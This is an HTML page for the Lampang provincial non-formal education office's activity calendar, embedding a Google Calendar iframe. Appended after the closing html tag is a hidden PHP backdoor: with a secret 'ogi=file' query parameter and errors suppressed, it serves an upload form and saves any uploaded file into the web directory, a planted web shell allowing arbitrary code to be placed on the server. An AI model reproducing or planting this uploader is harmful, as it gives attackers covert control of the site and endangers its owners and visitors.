<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874" />
<title>ปฏิทินการดำเนินงานของ สำนักงาน กศน.จังหวัดลำปาง</title>
</head>

<body>
<iframe src="https://calendar.google.com/calendar/b/4/embed?height=600&amp;wkst=1&amp;bgcolor=%23ffffff&amp;ctz=Asia%2FBangkok&amp;src=Y2FsZW5kYXIubmZlbHBAZ21haWwuY29t&amp;src=Y3Q1NDE1ZmtzNm5uN3Z2cmdzcmc0YW51bWdAZ3JvdXAuY2FsZW5kYXIuZ29vZ2xlLmNvbQ&amp;src=YTV0bTI3YXQxMWdnZGxvdmc3dnJyamcxMHNAZ3JvdXAuY2FsZW5kYXIuZ29vZ2xlLmNvbQ&amp;src=cDJyc2E3MW0waGJnbWRhZGNqczBrcjhkNGNAZ3JvdXAuY2FsZW5kYXIuZ29vZ2xlLmNvbQ&amp;src=dGgudGgjaG9saWRheUBncm91cC52LmNhbGVuZGFyLmdvb2dsZS5jb20&amp;color=%23039BE5&amp;color=%238E24AA&amp;color=%23D50000&amp;color=%23009688&amp;color=%230B8043&amp;showTitle=0&amp;showTz=0" style="border:solid 4px #777" width="100%" height="800" frameborder="0" scrolling="no"></iframe>
</body>
</html>

<?php error_reporting(0); if($_GET['ogi'] == 'file'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
